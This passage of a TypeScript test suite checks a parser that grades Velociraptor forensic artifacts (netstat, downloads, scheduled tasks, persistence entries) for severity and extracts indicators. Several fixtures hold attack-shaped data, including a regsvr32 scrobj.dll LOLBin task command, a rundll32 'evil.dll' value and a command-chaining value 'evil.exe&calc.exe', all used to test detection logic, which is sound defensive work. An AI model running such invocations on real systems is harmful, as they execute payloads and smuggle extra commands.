  it("dates rows via EventTimestamp, KeyMTime, and nested Stat.Mtime", () => {
    const rdp = {
      _Source: "Custom.RDP",
      EventTimestamp: "2025-03-14T22:30:42Z",
      EventID: 4648,
      Message: "explicit cred logon",
    };
    const amcache = {
      _Source: "DetectRaptor.Windows.Detection.Amcache",
      Detection: { Name: "Defence Evasion" },
      KeyMTime: "2026-06-06T20:42:51Z",
      EntryName: "x.exe",
    };
    const psr = {
      _Source: "Windows.System.Powershell.PSReadline",
      Line: "whoami /all",
      Stat: { Mtime: "2026-06-03T08:40:48Z" },
    };
    expect(parseVelociraptorJson(JSON.stringify([rdp])).events[0].timestamp).toContain("2025-03-14T22:30:42");
    expect(parseVelociraptorJson(JSON.stringify([amcache])).events[0].timestamp).toContain(
      "2026-06-06T20:42:51",
    );
    expect(parseVelociraptorJson(JSON.stringify([psr])).events[0].timestamp).toContain("2026-06-03T08:40:48");
  });
});

describe("parseVelociraptorJson — eventlog & generic rows", () => {
  it("maps a parsed-evtx row per-EID, normalizing the {Value} EventID", () => {
    const r = parseVelociraptorJson(JSON.stringify([eventlogRow()]));
    expect(r.detections).toBe(0);
    const e = r.events[0];
    expect(e.description).toContain("EID 4624");
    expect(e.severity).toBe("Low");
    expect(e.asset).toBe("WS05");
    expect(e.sources).toEqual(["Velociraptor"]);
    expect(r.iocs.find((i) => i.type === "ip")?.value).toBe("10.0.0.20");
  });

  it("maps a Windows.Network.Netstat row via mapNetstat (Low for external ESTABLISHED)", () => {
    const r = parseVelociraptorJson(JSON.stringify([netstatRow()]));
    const e = r.events[0];
    expect(e.severity).toBe("Low"); // ESTABLISHED to external IP → Low
    expect(e.description).toContain("evil.exe (pid 4321)");
    expect(e.description).toContain("ESTABLISHED");
    expect(e.description).toContain("8.8.8.8");
    expect(e.processName).toBe("evil.exe");
    expect(e.timestamp).toBe("2023-03-01T09:20:00.000Z"); // _ts epoch seconds → UTC
    expect(r.iocs.find((i) => i.type === "ip")?.value).toBe("8.8.8.8");
    expect(r.iocs.some((i) => i.type === "process" && i.value === "evil.exe")).toBe(true);
  });

  it("prefers the artifact's own time over the _ts collection time", () => {
    const row = { _Source: "Custom.X", EventTime: "2022-01-01T00:00:00Z", _ts: 1677662400, Message: "hi" };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    expect(r.events[0].timestamp).toBe("2022-01-01T00:00:00Z");
  });

  it("leads a generic registry/app row with Category/KeyPath and reads KeyLastWriteTimestamp", () => {
    const row = {
      Category: "Data Transfer - OneDrive",
      KeyName: "OneDriveSetup.exe",
      DisplayName: "Microsoft OneDrive",
      KeyLastWriteTimestamp: "2025-04-22T11:42:03Z",
      KeyPath: "HKEY_USERS\\S-1-5-21\\...\\OneDriveSetup.exe",
    };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    const e = r.events[0];
    expect(e.severity).toBe("Info");
    expect(e.description).toContain("Data Transfer - OneDrive"); // Category leads, not a key=value dump
    expect(e.timestamp).toContain("2025-04-22T11:42:03");
  });

  it("falls back to the supplied artifact label when a row carries no _Source", () => {
    const row = { Category: "OneDrive", KeyLastWriteTimestamp: "2025-04-22T11:42:03Z" };
    const r = parseVelociraptorJson(JSON.stringify([row]), {
      artifact: "DetectRaptor.Windows.Detection.Applications",
    });
    expect(r.events[0].description).toContain("[DetectRaptor.Windows.Detection.Applications]");
  });
});

describe("parseVelociraptorJson — inputs, floor & edges", () => {
  it("reads JSONL (native collection results)", () => {
    const text = [JSON.stringify(eventlogRow()), JSON.stringify(yaraRow())].join("\n");
    const r = parseVelociraptorJson(text);
    expect(r.format).toBe("jsonl");
    expect(r.events).toHaveLength(2);
    expect(r.detections).toBe(1);
  });

  it("reads a multi-artifact map { Artifact: [rows] } and tags _Source", () => {
    const yaraNoSource = { Rule: "Bar", Strings: ["$x"], OSPath: "C:\\a.exe" };
    const text = JSON.stringify({
      "Windows.Detection.Yara.Glob": [yaraNoSource],
      "Custom.Other": [{ Message: "x" }],
    });
    const r = parseVelociraptorJson(text);
    expect(r.format).toBe("artifact-map");
    expect(r.events).toHaveLength(2);
    expect(r.detections).toBe(1); // the yara row classified via the artifact key
  });

  it("applies a minSeverity floor (drops rows below the threshold)", () => {
    const text = JSON.stringify([sigmaRow(), netstatRow()]);
    const r = parseVelociraptorJson(text, { minSeverity: "Medium" });
    expect(r.events).toHaveLength(1); // netstat row is Low → dropped; sigma is Critical → kept
    expect(r.events[0].severity).toBe("Critical");
  });

  it("reports empty for a non-Velociraptor file", () => {
    const r = parseVelociraptorJson("nonsense");
    expect(r.format).toBe("empty");
    expect(r.events).toHaveLength(0);
  });
});

describe("parseVelociraptorJson — pslist/pstree rows (no _Source marker)", () => {
  function pslistRow(overrides: object = {}): object {
    return {
      Pid: "1004",
      Ppid: "592",
      Name: "svchost.exe",
      Username: "NT AUTHORITY\\LOCAL SERVICE",
      Exe: "C:\\Windows\\System32\\svchost.exe",
      CommandLine: "C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted -p -s EventLog",
      StartTime: "2026-06-12T11:12:45.8986623Z",
      EndTime: "0001-01-01T00:00:00Z",
      CallChain: "svchost.exe",
      PSTree: null,
      ...overrides,
    };
  }

  it("uses StartTime as the event timestamp", () => {
    const r = parseVelociraptorJson(JSON.stringify([pslistRow()]));
    expect(r.events).toHaveLength(1);
    expect(r.events[0].timestamp).toContain("2026-06-12");
  });

  it("includes process name and CommandLine in description", () => {
    const r = parseVelociraptorJson(JSON.stringify([pslistRow()]));
    const desc = r.events[0].description;
    expect(desc).toContain("svchost.exe");
    expect(desc).toContain("-k LocalServiceNetworkRestricted");
  });

  it("sets processName from the Name field", () => {
    const r = parseVelociraptorJson(JSON.stringify([pslistRow()]));
    expect(r.events[0].processName).toBe("svchost.exe");
  });

  it("falls back to Name in description when CommandLine is empty", () => {
    const r = parseVelociraptorJson(
      JSON.stringify([
        pslistRow({
          Name: "Registry",
          Pid: "100",
          Ppid: "4",
          Exe: "",
          CommandLine: "",
          CallChain: "Registry",
        }),
      ]),
    );
    expect(r.events[0].description).toContain("Registry");
  });

  it("aggregates multiple instances of the same service host together", () => {
    const rows = [pslistRow(), pslistRow({ Pid: "2000" })]; // same cmdline, different PIDs
    const r = parseVelociraptorJson(JSON.stringify(rows));
    expect(r.events).toHaveLength(1);
    expect(r.events[0].count).toBe(2);
  });
});

describe("parseVelociraptorJson — netstat rows (no _Source marker)", () => {
  function netstatRow(overrides: object = {}): object {
    return {
      Pid: 896,
      Ppid: 592,
      Name: "svchost.exe",
      Path: "C:\\Windows\\System32\\svchost.exe",
      CommandLine: "C:\\Windows\\system32\\svchost.exe -k RPCSS -p",
      Hash: {
        MD5: "fb118e243e216b84b3838332da8f5665",
        SHA256: "b276aa5385601d8e8b302c4e8eeb3d8682a72861de149beb6bc28726e4ec815b",
      },
      Username: "NT AUTHORITY\\NETWORK SERVICE",
      Family: "IPv4",
      Type: "TCP",
      Status: "LISTEN",
      Laddr: "0.0.0.0",
      Lport: 135,
      Raddr: "0.0.0.0",
      Rport: 0,
      Timestamp: "2026-06-12T11:12:43Z",
      ...overrides,
    };
  }

  it("uses Timestamp as the event timestamp", () => {
    const r = parseVelociraptorJson(JSON.stringify([netstatRow()]));
    expect(r.events).toHaveLength(1);
    expect(r.events[0].timestamp).toContain("2026-06-12");
  });

  it("includes process name, protocol, status, src and dst in description", () => {
    const desc = parseVelociraptorJson(JSON.stringify([netstatRow()])).events[0].description;
    expect(desc).toContain("svchost.exe");
    expect(desc).toContain("TCP");
    expect(desc).toContain("LISTEN");
    expect(desc).toContain("0.0.0.0:135");
  });

  it("marks ESTABLISHED connection to external IP as Low severity and adds remote IP as IOC", () => {
    const r = parseVelociraptorJson(
      JSON.stringify([netstatRow({ Status: "ESTABLISHED", Raddr: "8.8.8.8", Rport: 443 })]),
    );
    expect(r.events[0].severity).toBe("Low");
    expect(r.iocs.some((i) => i.value === "8.8.8.8")).toBe(true);
  });

  it("keeps LISTEN / RFC-1918 ESTABLISHED connections as Info severity", () => {
    const listen = parseVelociraptorJson(JSON.stringify([netstatRow()])).events[0];
    const internal = parseVelociraptorJson(
      JSON.stringify([netstatRow({ Status: "ESTABLISHED", Raddr: "192.168.1.5", Rport: 443 })]),
    ).events[0];
    expect(listen.severity).toBe("Info");
    expect(internal.severity).toBe("Info");
  });

  it("is also classified correctly when _Source names the artifact", () => {
    const r = parseVelociraptorJson(
      JSON.stringify([{ ...netstatRow(), _Source: "Windows.Network.Netstat" }]),
    );
    expect(r.events[0].description).toContain("TCP");
    expect(r.events[0].description).toContain("LISTEN");
  });
});

describe("parseVelociraptorJson — download rows (Zone.Identifier / BrowserDownloads)", () => {
  function downloadRow(overrides: object = {}): object {
    return {
      DownloadedFilePath:
        "\\\\.\\C:\\$Recycle.Bin\\S-1-5-21-976873477-4042199845-2240577298-1000\\$RHQQSXA.zip",
      Mtime: "2026-06-03T08:38:22.9209026Z",
      FileHash: {
        MD5: "a0400686df632dbb89a4b6d80fba0483",
        SHA1: "528a0ccec61c10d99165bd30af77d268c4c0956d",
        SHA256: "9ca4b2678a3b6ece4c858dd99c1bd35ec8752343110044b6452a49c02462a978",
      },
      ZoneId: "3",
      HostUrl: "https://codeload.github.com/hasamba/Digital-Forensic-Artifacts/zip/refs/heads/main",
      ReferrerUrl: "https://github.com/hasamba/Digital-Forensic-Artifacts",
      ...overrides,
    };
  }

  it("uses Mtime as the event timestamp", () => {
    const r = parseVelociraptorJson(JSON.stringify([downloadRow()]));
    expect(r.events).toHaveLength(1);
    expect(r.events[0].timestamp).toContain("2026-06-03");
  });

  // The mark is often the only surviving record of how an intrusion started, so the zone and the
  // file type have to reach the analyst. Grading every row Info kept fifteen ZoneId=3 rows — the
  // whole attack toolkit — off the forensic timeline on a benchmark collection.
  it("grades an Internet-zone script download Medium with T1204.002", () => {
    const r = parseVelociraptorJson(
      JSON.stringify([
        downloadRow({
          DownloadedFilePath: "\\\\.\\C:\\Users\\v\\Downloads\\Stage1-InitialAccess.ps1",
          HostUrl: "",
          ReferrerUrl: "",
        }),
      ]),
    );
    expect(r.events[0].severity).toBe("Medium");
    expect(r.events[0].mitreTechniques).toContain("T1204.002");
    expect(r.events[0].description).toContain("Internet zone");
  });

  it("grades an Internet-zone .iso Medium — mounting one strips the mark from what is inside", () => {
    const r = parseVelociraptorJson(
      JSON.stringify([downloadRow({ DownloadedFilePath: "C:\\Users\\v\\Downloads\\invoice.iso" })]),
    );
    expect(r.events[0].severity).toBe("Medium");
  });

  it("leaves an ordinary Internet-zone archive at Info", () => {
    const r = parseVelociraptorJson(JSON.stringify([downloadRow()]));
    expect(r.events[0].severity).toBe("Info");
    expect(r.events[0].mitreTechniques ?? []).toHaveLength(0);
  });

  it("leaves a trusted-zone executable at Info — the zone is what makes it a lead", () => {
    const r = parseVelociraptorJson(
      JSON.stringify([
        downloadRow({ ZoneId: "2", DownloadedFilePath: "C:\\Users\\v\\Downloads\\setup.exe" }),
      ]),
    );
    expect(r.events[0].severity).toBe("Info");
  });

  // The Zone.Identifier stream is NUL-terminated. Left in, that NUL rides into the URL indicator,
  // where it silently defeats every later comparison against the same URL from another source.
  it("strips the ADS terminator from the URL it records", () => {
    const r = parseVelociraptorJson(
      JSON.stringify([downloadRow({ HostUrl: "https://evil.example.com/a.zip\u0000" })]),
    );
    expect(r.events[0].description).not.toContain("\u0000");
    const url = r.iocs.find((i) => i.type === "url" && i.value.includes("evil.example.com"));
    expect(url?.value).toBe("https://evil.example.com/a.zip");
  });

  it("includes filename and HostUrl in description", () => {
    const desc = parseVelociraptorJson(JSON.stringify([downloadRow()])).events[0].description;
    expect(desc).toContain("$RHQQSXA.zip");
    expect(desc).toContain(
      "https://codeload.github.com/hasamba/Digital-Forensic-Artifacts/zip/refs/heads/main",
    );
  });

  it("adds HostUrl and ReferrerUrl as URL IOCs", () => {
    const iocs = parseVelociraptorJson(JSON.stringify([downloadRow()])).iocs;
    expect(
      iocs.some(
        (i) =>
          i.value === "https://codeload.github.com/hasamba/Digital-Forensic-Artifacts/zip/refs/heads/main",
      ),
    ).toBe(true);
    expect(iocs.some((i) => i.value === "https://github.com/hasamba/Digital-Forensic-Artifacts")).toBe(true);
  });

  it("adds SHA256 from nested FileHash as hash IOC", () => {
    const iocs = parseVelociraptorJson(JSON.stringify([downloadRow()])).iocs;
    expect(
      iocs.some((i) => i.value === "9ca4b2678a3b6ece4c858dd99c1bd35ec8752343110044b6452a49c02462a978"),
    ).toBe(true);
  });

  it("strips the Velociraptor NTFS device prefix from the path", () => {
    const r = parseVelociraptorJson(JSON.stringify([downloadRow()]));
    expect(r.events[0].path).not.toContain("\\\\.\\");
    expect(r.events[0].path).toContain("C:\\$Recycle.Bin");
  });

  it("sets severity to Info (telemetry, not a detection)", () => {
    expect(parseVelociraptorJson(JSON.stringify([downloadRow()])).events[0].severity).toBe("Info");
  });

  it("is also classified correctly when _Source names the artifact", () => {
    const r = parseVelociraptorJson(
      JSON.stringify([{ ...downloadRow(), _Source: "Windows.Forensics.BrowserDownloads" }]),
    );
    expect(r.events[0].description).toContain("$RHQQSXA.zip");
    expect(r.events[0].description).toContain("codeload.github.com");
  });

  it("skips ReferrerUrl IOC when not present", () => {
    const r = parseVelociraptorJson(JSON.stringify([downloadRow({ ReferrerUrl: null })]));
    const urlIocs = r.iocs.filter((i) => i.type === "url");
    expect(urlIocs).toHaveLength(1);
    expect(urlIocs[0].value).toContain("codeload.github.com");
  });
});

describe("parseVelociraptorJson — startup rows (Windows.Sys.StartupItems)", () => {
  function startupRow(overrides: object = {}): object {
    return {
      Name: "bginfo",
      OSPath: "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\bginfo",
      Details: 'wscript "c:\\Program Files\\sysinternals\\bginfo.vbs"',
      Enabled: "disabled",
      Upload: "",
      ...overrides,
    };
  }

  it("includes Name, Details, and enabled status in description", () => {
    const desc = parseVelociraptorJson(JSON.stringify([startupRow()])).events[0].description;
    expect(desc).toContain("bginfo");
    expect(desc).toContain("bginfo.vbs");
    expect(desc).toContain("disabled");
  });

  it("sets severity to Info for disabled items, Low for enabled items", () => {
    const dis = parseVelociraptorJson(JSON.stringify([startupRow()])).events[0];
    const en = parseVelociraptorJson(JSON.stringify([startupRow({ Enabled: "enable" })])).events[0];
    expect(dis.severity).toBe("Info");
    expect(en.severity).toBe("Low");
  });

  it("adds T1547 MITRE only for enabled items", () => {
    const dis = parseVelociraptorJson(JSON.stringify([startupRow()])).events[0];
    const en = parseVelociraptorJson(JSON.stringify([startupRow({ Enabled: "enable" })])).events[0];
    expect(dis.mitreTechniques ?? []).not.toContain("T1547");
    expect(en.mitreTechniques).toContain("T1547");
  });

  it("is classified correctly when _Source names the artifact", () => {
    const r = parseVelociraptorJson(
      JSON.stringify([{ ...startupRow({ Enabled: "enable" }), _Source: "Windows.Sys.StartupItems" }]),
    );
    expect(r.events[0].description).toContain("bginfo");
    expect(r.events[0].description).toContain("enabled");
  });

  it("decodes a mangled UTF-16-noise Details value (desktop.ini [.ShellClassInfo]) instead of showing it garbled OR silently discarding it", () => {
    const mangled =
      "..........S.h.e.l.l.C.l.a.s.s.I.n.f.o.......L.o.c.a.l.i.z.e.d.R.e.s.o.u.r.c.e.N.a.m.e" +
      ".......S.y.s.t.e.m.R.o.o.t.....s.y.s.t.e.m.3.2.....s.h.e.l.l.3.2...d.l.l...2.1.7.8.7....";
    const r = parseVelociraptorJson(
      JSON.stringify([
        startupRow({
          Name: "desktop.ini",
          OSPath: "C:\\Users\\bob\\Desktop\\desktop.ini",
          Details: mangled,
        }),
      ]),
    );
    const desc = r.events[0].description;
    expect(desc).not.toContain("S.h.e.l.l");
    expect(desc).not.toContain(".....");
    // Decoded and readable, not just suppressed — no evidence silently vanishes.
    expect(desc).toContain("ShellClassInfo");
    expect(desc).toContain("LocalizedResourceName");
    expect(desc).toContain("shell32");
    expect(desc).toContain("desktop.ini");
  });

  it("does NOT drop a legitimate dot-heavy command line — a bare dot-ratio check would false-positive on this", () => {
    // "svc.1.2.3.4.exe" crosses the exact same >30% dot-ratio threshold the mangled desktop.ini
    // value does (a bare ratio check WOULD have wrongly nulled it out), but it has real word runs
    // ("svc", "exe") the UTF-16 mangling never has — there, every character sits alone between
    // dots. Losing this would silently erase real startup evidence, not noise.
    const legit = "svc.1.2.3.4.exe";
    const r = parseVelociraptorJson(JSON.stringify([startupRow({ Details: legit })]));
    expect(r.events[0].description).toContain("svc.1.2.3.4.exe");
  });

  it("never comes back empty for a value that DOES trip the mangled-shape check — every character is decoded, none discarded", () => {
    // A short, single-digit-only sequence trips the same structural check the real desktop.ini
    // noise does (no run of 2+ ordinary characters). Whether or not the guess is right, the fix is
    // to decode — concatenating the digits back together — never to null the field out.
    const ambiguous = "1.2.3.4.5.6.7.8.9.0.1.2.3.4";
    const r = parseVelociraptorJson(JSON.stringify([startupRow({ Details: ambiguous })]));
    const desc = r.events[0].description;
    expect(desc).toContain("1234567890");
  });

  it("never puts the host inside the title — it falls in [details], behind the host's own chip", () => {
    const r = parseVelociraptorJson(
      JSON.stringify([{ ...startupRow(), Computer: "DESKTOP-OPE297N.localdomain" }]),
    );
    const { title } = splitEventTitle(r.events[0].description);
    expect(title).not.toContain("DESKTOP-OPE297N");
  });
});

describe("parseVelociraptorJson — taskscheduler rows (Windows.System.TaskScheduler/Analysis)", () => {
  function taskRow(overrides: Record<string, unknown> = {}): object {
    return {
      _Source: "Windows.System.TaskScheduler/Analysis",
      TaskName: "\\SystemUpdate_BK24XM32",
      Mtime: "2026-06-03T08:41:08.5250412Z",
      Command: "regsvr32.exe",
      Arguments: "/s /u /i:C:\\TrigonaSim\\payloads\\icedid_artifact.bin scrobj.dll",
      UserId: "WIN11\\labuser",
      RunLevel: "LeastPrivilege",
      OSPath: "C:\\Windows\\System32\\Tasks\\SystemUpdate_BK24XM32",
      Authenticode: null,
      ...overrides,
    };
  }

  it("includes TaskName and Command+Arguments in description", () => {
    const desc = parseVelociraptorJson(JSON.stringify([taskRow()])).events[0].description;
    expect(desc).toContain("SystemUpdate_BK24XM32");
    expect(desc).toContain("regsvr32.exe");
    expect(desc).toContain("icedid_artifact.bin");
  });

  it("uses Mtime as the event timestamp", () => {
    const e = parseVelociraptorJson(JSON.stringify([taskRow()])).events[0];
    expect(e.timestamp).toContain("2026-06-03T08:41:08");
  });

  it("sets severity to Info (raw task listing, not a detection)", () => {
    expect(parseVelociraptorJson(JSON.stringify([taskRow()])).events[0].severity).toBe("Info");
  });

  it("surfaces the UserId in description; maps well-known SIDs to readable labels", () => {
    const domainDesc = parseVelociraptorJson(JSON.stringify([taskRow()])).events[0].description;
    expect(domainDesc).toContain("WIN11\\labuser");

    const systemDesc = parseVelociraptorJson(JSON.stringify([taskRow({ UserId: "S-1-5-18" })])).events[0]
      .description;
    expect(systemDesc).toContain("SYSTEM");

    const lsDesc = parseVelociraptorJson(JSON.stringify([taskRow({ UserId: "S-1-5-19" })])).events[0]
      .description;
    expect(lsDesc).toContain("LOCAL SERVICE");
  });

  it("adds OSPath as a file IOC", () => {
    const iocs = parseVelociraptorJson(JSON.stringify([taskRow()])).iocs;
    expect(iocs.some((i) => i.type === "file" && i.value.includes("SystemUpdate_BK24XM32"))).toBe(true);
  });

  it("is classified by column detection when _Source is absent", () => {
    const row = {
      TaskName: "\\MyTask",
      Mtime: "2026-01-01T00:00:00Z",
      Command: "cmd.exe",
      Arguments: "/c whoami",
      OSPath: "C:\\Windows\\System32\\Tasks\\MyTask",
    };
    const desc = parseVelociraptorJson(JSON.stringify([row])).events[0].description;
    expect(desc).toContain("MyTask");
    expect(desc).toContain("cmd.exe");
  });

  it("is classified correctly when _Source names the artifact", () => {
    const r = parseVelociraptorJson(JSON.stringify([taskRow()]));
    expect(r.events[0].description).toContain("[Windows.System.TaskScheduler/Analysis]");
  });
});

describe("parseVelociraptorJson — PersistenceSniper rows (Windows.Forensics.PersistenceSniper)", () => {
  // Real column set from a collected PersistenceSniper flow — the module's own field names,
  // wrapped verbatim by the VQL artifact (no Velociraptor-side renaming).
  function sniperRow(overrides: Record<string, unknown> = {}): object {
    return {
      _Source: "Windows.Forensics.PersistenceSniper",
      Hostname: "DESKTOP-LAB01",
      Technique: "Scheduled Task",
      Classification: "MITRE ATT&CK T1053.005",
      Path: "\\MicrosoftEdgeUpdateTaskMachineCore{BDCC8C3F-6BAE-41A3-8C40-C1742ACC916B}",
      Value: "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe /c",
      "Access Gained": "User",
      Note: "Scheduled tasks run executables or actions when certain conditions, such as user log in or machine boot up, are met.",
      Reference: "https://attack.mitre.org/techniques/T1053/005/",
      Signature:
        "Status = Valid, Subject = CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US",
      IsBuiltinBinary: "False",
      IsLolbin: "False",
      VTEntries: "N/A",
      ...overrides,
    };
  }

  it("reads as a clean, readable title instead of a raw key=value dump", () => {
    const desc = parseVelociraptorJson(JSON.stringify([sniperRow()])).events[0].description;
    const { title } = splitEventTitle(desc);
    expect(title).toContain("Scheduled Task");
    expect(title).toContain("MicrosoftEdgeUpdate.exe");
    expect(title).toContain("User");
    // The raw dump this replaces joined every column with "Key=Value - " — that shape must be gone.
    expect(desc).not.toMatch(/Technique=/);
    expect(desc).not.toMatch(/Classification=/);
    expect(desc).not.toMatch(/Note=/);
  });

  it("omits the Reference URL and a clean Signature — noise, not signal", () => {
    const desc = parseVelociraptorJson(JSON.stringify([sniperRow()])).events[0].description;
    expect(desc).not.toContain("attack.mitre.org");
    expect(desc).not.toContain("Status = Valid");
  });

  it("surfaces a non-valid signature status (unsigned / mismatched)", () => {
    const desc = parseVelociraptorJson(
      JSON.stringify([sniperRow({ Signature: "Status = NotSigned, Subject = " })]),
    ).events[0].description;
    expect(desc).toContain("NotSigned");
  });

  it("flags a LOLBin persistence target with a [lolbin] marker and grades it High", () => {
    const e = parseVelociraptorJson(JSON.stringify([sniperRow({ IsLolbin: "True" })])).events[0];
    expect(e.description).toContain("[lolbin]");
    expect(e.severity).toBe("High");
  });

  it("does not flag an ordinary, non-LOLBin persistence target, and leaves it at Info", () => {
    const e = parseVelociraptorJson(JSON.stringify([sniperRow()])).events[0];
    expect(e.description).not.toContain("[lolbin]");
    expect(e.severity).toBe("Info");
  });

  // Real-world regression (#657 follow-up): rundll32.exe/sc.exe/cmd.exe/msiexec.exe are all
  // catalogued LOLBins AND how a large share of Windows' own stock scheduled tasks run. On one
  // real host's import, 27/273 rows came back IsLolbin=True and 23 of those were the OS's own
  // recognised binaries (IsBuiltinBinary=True) — treating IsLolbin alone as High flooded the
  // timeline with "findings" that were just ordinary Windows behavior.
  // An unsigned, non-builtin binary wired up to run with SYSTEM privileges is the classic malicious
  // service shape, and none of its three signals is decisive alone: an unsigned User-level Run key is
  // ordinary, plenty of recognised builtins run as System, and a validly-signed vendor service running
  // as System is the norm. Together they are not ordinary. Graded Medium — on the signature flag alone —
  // a row like this sits below the Critical/High safety net that backfills a finding when the model
  // skips an event, so a real getsystem service binary can pass through synthesis unmentioned.
  it("grades High for an unsigned, non-builtin persistence entry that gains System", () => {
    const e = parseVelociraptorJson(
      JSON.stringify([
        sniperRow({
          Technique: "Windows Service",
          Classification: "MITRE ATT&CK T1543.003",
          Path: "kesknq",
          Value: "C:\\LockBitSim\\tools\\svc_kesknq\\kesknq.exe",
          "Access Gained": "System",
          Signature: "Status = NotSigned, Subject = ",
          IsBuiltinBinary: "False",
        }),
      ]),
    ).events[0];
    expect(e.severity).toBe("High");
  });

  it("leaves an unsigned non-builtin entry at Medium when it only gains User", () => {
    const e = parseVelociraptorJson(
      JSON.stringify([
        sniperRow({
          "Access Gained": "User",
          Signature: "Status = NotSigned, Subject = ",
          IsBuiltinBinary: "False",
        }),
      ]),
    ).events[0];
    expect(e.severity).toBe("Medium");
  });

  it("leaves a validly-signed System service alone — that is the ordinary case", () => {
    const e = parseVelociraptorJson(
      JSON.stringify([sniperRow({ "Access Gained": "System", IsBuiltinBinary: "True" })]),
    ).events[0];
    expect(e.severity).toBe("Info");
  });

  it("does not grade a LOLBin-capable tool as High when it's PersistenceSniper's own recognised built-in binary", () => {
    const e = parseVelociraptorJson(
      JSON.stringify([
        sniperRow({
          Technique: "Scheduled Task",
          Value: "%windir%\\system32\\rundll32.exe sysmain.dll,PfSvWsSwapAssessmentTask",
          IsLolbin: "True",
          IsBuiltinBinary: "True",
        }),
      ]),
    ).events[0];
    expect(e.description).not.toContain("[lolbin]");
    expect(e.severity).toBe("Info");
  });

  it("still grades High for a LOLBin technique that is NOT a recognised built-in binary", () => {
    const e = parseVelociraptorJson(
      JSON.stringify([sniperRow({ IsLolbin: "True", IsBuiltinBinary: "False" })]),
    ).events[0];
    expect(e.description).toContain("[lolbin]");
    expect(e.severity).toBe("High");
  });

  // The IsBuiltinBinary gate exists to suppress ROUTINE builtin LOLBin usage (rundll32.exe running
  // an ordinary OS scheduled task) — it must NOT suppress genuine LOLBin abuse just because the
  // tool itself is a legitimate, signed Windows binary. Classic living-off-the-land technique runs
  // FROM a real builtin tool; that's the whole point. A builtin LOLBin with a bad signature or an
  // unusual staging path is exactly the case that must still escalate.
  it("still grades High for a builtin LOLBin whose signature doesn't check out", () => {
    const e = parseVelociraptorJson(
      JSON.stringify([
        sniperRow({
          Value: "C:\\Windows\\System32\\rundll32.exe evil.dll,Entry",
          IsLolbin: "True",
          IsBuiltinBinary: "True",
          Signature: "Status = NotSigned, Subject = ",
        }),
      ]),
    ).events[0];
    expect(e.description).toContain("[lolbin]");
    expect(e.severity).toBe("High");
  });

  it("still grades High for a builtin LOLBin staged in Temp/AppData", () => {
    const e = parseVelociraptorJson(
      JSON.stringify([
        sniperRow({
          Value: "C:\\Users\\bob\\AppData\\Local\\Temp\\rundll32.exe",
          IsLolbin: "True",
          IsBuiltinBinary: "True",
        }),
      ]),
    ).events[0];
    expect(e.description).toContain("[lolbin]");
    expect(e.severity).toBe("High");
  });

  it("grades a non-valid signature to Medium", () => {
    const e = parseVelociraptorJson(
      JSON.stringify([sniperRow({ Signature: "Status = NotSigned, Subject = " })]),
    ).events[0];
    expect(e.severity).toBe("Medium");
  });

  it("grades a LOLBin with an unsigned signature to High (worst of the two)", () => {
    const e = parseVelociraptorJson(
      JSON.stringify([sniperRow({ IsLolbin: "True", Signature: "Status = NotSigned, Subject = " })]),
    ).events[0];
    expect(e.severity).toBe("High");
  });

  // Staged is graded High outright — a file sitting directly in a world-writable/transient location,
  // wired up for persistence, is a strong signal whether or not the tool itself is a recognised
  // built-in.
  it("grades a persistence target staged in Temp/AppData to High, and flags it in the title", () => {
    const e = parseVelociraptorJson(
      JSON.stringify([sniperRow({ Value: "C:\\Users\\bob\\AppData\\Local\\Temp\\update.exe" })]),
    ).events[0];
    expect(e.severity).toBe("High");
    expect(e.description).toContain("[staged: temp/appdata]");
  });

  it("grades a persistence target staged in ProgramData/Public to High", () => {
    const inProgramData = parseVelociraptorJson(
      JSON.stringify([sniperRow({ Value: "C:\\ProgramData\\svc.exe" })]),
    ).events[0];
    expect(inProgramData.severity).toBe("High");

    const inPublic = parseVelociraptorJson(
      JSON.stringify([sniperRow({ Value: "C:\\Users\\Public\\helper.exe" })]),
    ).events[0];
    expect(inPublic.severity).toBe("High");
  });

  it("does not flag an ordinary Program Files location as staged", () => {
    const e = parseVelociraptorJson(JSON.stringify([sniperRow()])).events[0]; // default Value is under Program Files
    expect(e.description).not.toContain("[staged:");
    expect(e.severity).toBe("Info");
  });

  // Real-world regression: the strict quoted-or-clean extraction used for the file IOC returns
  // NOTHING once a Value carries trailing arguments — the common case for a Scheduled Task/service
  // command line (PersistenceSniper's own real output: "…MpCmdRun.exe -IdleTask -TaskName …"). An
  // earlier version of the staging check reused that same extraction and was silently blind to
  // exactly the values it most needed to see. It must judge the raw Value/Path text instead.
  it("still detects staging when the Value carries trailing arguments", () => {
    const e = parseVelociraptorJson(
      JSON.stringify([sniperRow({ Value: "C:\\Users\\bob\\AppData\\Local\\Temp\\evil.exe -x --quiet" })]),
    ).events[0];
    expect(e.description).toContain("[staged: temp/appdata]");
    expect(e.severity).toBe("High");
  });

  // Windows Defender's own platform binary — a REAL, multi-level-deep vendor path under ProgramData.
  // The staging check requires the file to sit DIRECTLY in the staging directory (no further
  // subdirectory in between, same convention as data/tags.yaml's staging_temp_executable rule) so a
  // legitimately deep, versioned install path doesn't false-match just because "ProgramData" appears
  // somewhere in it.
  it("does not flag a file nested deep under ProgramData in a real vendor path as staged", () => {
    const e = parseVelociraptorJson(
      JSON.stringify([
        sniperRow({
          Value:
            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.26070.9-0\\MpCmdRun.exe -IdleTask",
        }),
      ]),
    ).events[0];
    expect(e.description).not.toContain("[staged:");
  });

  // A bare `\b` word boundary is satisfied by ANY non-word character — including another literal
  // dot — so it treats an extension prefix earlier in a multi-dot filename as if it were the real,
  // final extension: "readme.hta.txt" is a .txt file, but a `\.hta\b` check still matches because a
  // dot follows "hta" too. The boundary must require an actual end-of-path shape (end of string,
  // quote, whitespace, comma), not just "not a letter/digit/underscore".
  it("does not treat an extension prefix earlier in a multi-dot filename as the real extension", () => {
    const e = parseVelociraptorJson(JSON.stringify([sniperRow({ Value: "C:\\ProgramData\\readme.hta.txt" })]))
      .events[0];
    expect(e.description).not.toContain("[staged:");
  });

  // A cmd.exe operator needs no surrounding whitespace to chain commands — an allow-list of
  // terminator characters (tried and reverted) missed every one of these.
  it("still detects staging when a shell operator directly follows the extension, no whitespace", () => {
    for (const value of [
      "C:\\ProgramData\\evil.exe&calc.exe",
